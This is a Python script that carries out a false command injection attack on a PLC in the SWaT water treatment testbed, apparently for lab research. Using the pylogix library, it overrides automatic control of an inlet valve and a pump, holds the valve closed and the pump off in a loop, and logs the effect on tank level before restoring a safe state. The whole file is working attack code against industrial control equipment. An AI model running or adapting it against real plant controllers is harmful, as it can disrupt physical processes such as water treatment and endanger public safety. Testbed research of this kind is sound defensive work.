#!/usr/bin/env python3
"""
phase1_inject.py  —  SWaT Phase 1: False Command Injection (HMI-based)
Target: Allen-Bradley ControlLogix PLC1 at 192.168.1.10

Running from the HMI directly — no ARP poisoning needed.
The HMI already has legitimate EtherNet/IP access to PLC1.
We simply write false tag values directly via pylogix.

Attack:
  - Take MV101 out of auto, command CLOSE
  - Take P101 out of auto, command OFF
  - Loop for duration seconds
  - On exit: restore safe state

Usage:
  python3 phase1_inject.py --plc-ip 192.168.1.10 --duration 120
"""

import argparse, time, signal, pickle, os
from datetime import datetime
from pylogix import PLC

# Attack commands — two-step pattern: disable auto, issue command
ATTACK_CMDS = [
    ('HMI_MV101.Auto', False),   # take MV101 out of auto mode
    ('HMI_MV101.Cmd',  1),       # 1=CLOSE inlet valve
    ('HMI_P101.Auto',  False),   # take P101 out of auto mode
    ('HMI_P101.Cmd',   1),       # 1=OFF stop pump
]

# Safe state to restore on exit
SAFE_CMDS = [
    ('HMI_MV101.Cmd',  2),       # 2=OPEN inlet valve
    ('HMI_MV101.Auto', True),    # restore auto
    ('HMI_P101.Cmd',   2),       # 2=ON start pump
    ('HMI_P101.Auto',  True),    # restore auto
]

stop_flag = False


def write_tag(plc, tag, value):
    ret = plc.Write(tag, value)
    return ret


def inject_loop(plc_ip, duration, interval=1.0):
    print(f"[*] Connecting to PLC1 at {plc_ip}...")
    cycle = 0
    end_time = time.time() + duration

    with PLC() as plc:
        plc.IPAddress = plc_ip

        # Verify connection first
        test = plc.Read('HMI_LIT101.Pv')
        if test.Value is None:
            print(f"[!] Cannot read PLC — check IP and connectivity: {test.Status}")
            return

        print(f"[*] Connected. LIT101={test.Value:.1f}mm")
        print(f"[*] Injecting false commands for {duration}s — Ctrl+C to abort\n")

        while not stop_flag and time.time() < end_time:
            errors = []
            for tag, val in ATTACK_CMDS:
                ret = write_tag(plc, tag, val)
                if ret.Status != 'Success':
                    errors.append(f"{tag}: {ret.Status}")

            # Read current state to show effect
            lit = plc.Read('HMI_LIT101.Pv').Value
            fit = plc.Read('AI_FIT_101_FLOW').Value
            mv  = plc.Read('HMI_MV101.Cmd').Value

            cycle += 1
            ts = datetime.now().strftime('%H:%M:%S')
            if errors:
                print(f"[{ts}] cycle={cycle:4d}  ERRORS: {errors}")
            else:
                print(f"[{ts}] cycle={cycle:4d}  "
                      f"MV101={'CLOSED' if mv==1 else 'OPEN'}  "
                      f"LIT101={lit:.1f}mm  FIT101={fit:.3f}  "
                      f"[attack active]")
            time.sleep(interval)


def restore_plc(plc_ip):
    print(f"\n[*] Restoring safe state on PLC {plc_ip}...")
    try:
        with PLC() as plc:
            plc.IPAddress = plc_ip
            for tag, val in SAFE_CMDS:
                ret = plc.Write(tag, val)
                status = ret.Status
                print(f"    {tag} = {val}  [{status}]")

        # Verify
        with PLC() as plc:
            plc.IPAddress = plc_ip
            mv  = plc.Read('HMI_MV101.Cmd').Value
            p1a = plc.Read('HMI_P101.Auto').Value
            lit = plc.Read('HMI_LIT101.Pv').Value
            print(f"\n[+] Verified: MV101={'OPEN' if mv==2 else 'CLOSED'}  "
                  f"P101.Auto={p1a}  LIT101={lit:.1f}mm")
        print("[+] Safe state restored.")
    except Exception as e:
        print(f"[!] Restore failed: {e}")
        print("    *** Manually restore MV101 and P101 via HMI interface! ***")


def signal_handler(sig, frame):
    global stop_flag
    print("\n[!] Ctrl+C — stopping attack...")
    stop_flag = True


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--plc-ip',   default='192.168.1.10', help='PLC1A IP address')
    ap.add_argument('--duration', type=int, default=120,  help='Attack duration in seconds')
    ap.add_argument('--interval', type=float, default=1.0, help='Write interval in seconds')
    args = ap.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    print("=" * 60)
    print("  SWaT Phase 1 — Direct CIP Tag Injection (HMI-based)")
    print(f"  PLC: {args.plc_ip}   Duration: {args.duration}s")
    print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    print("[*] Note: Running from HMI — no ARP poisoning needed")
    print("[*] HMI has direct EtherNet/IP access to PLC1\n")

    inject_loop(args.plc_ip, args.duration, args.interval)
    restore_plc(args.plc_ip)
    print("[+] Phase 1 complete.")


if __name__ == '__main__':
    main()
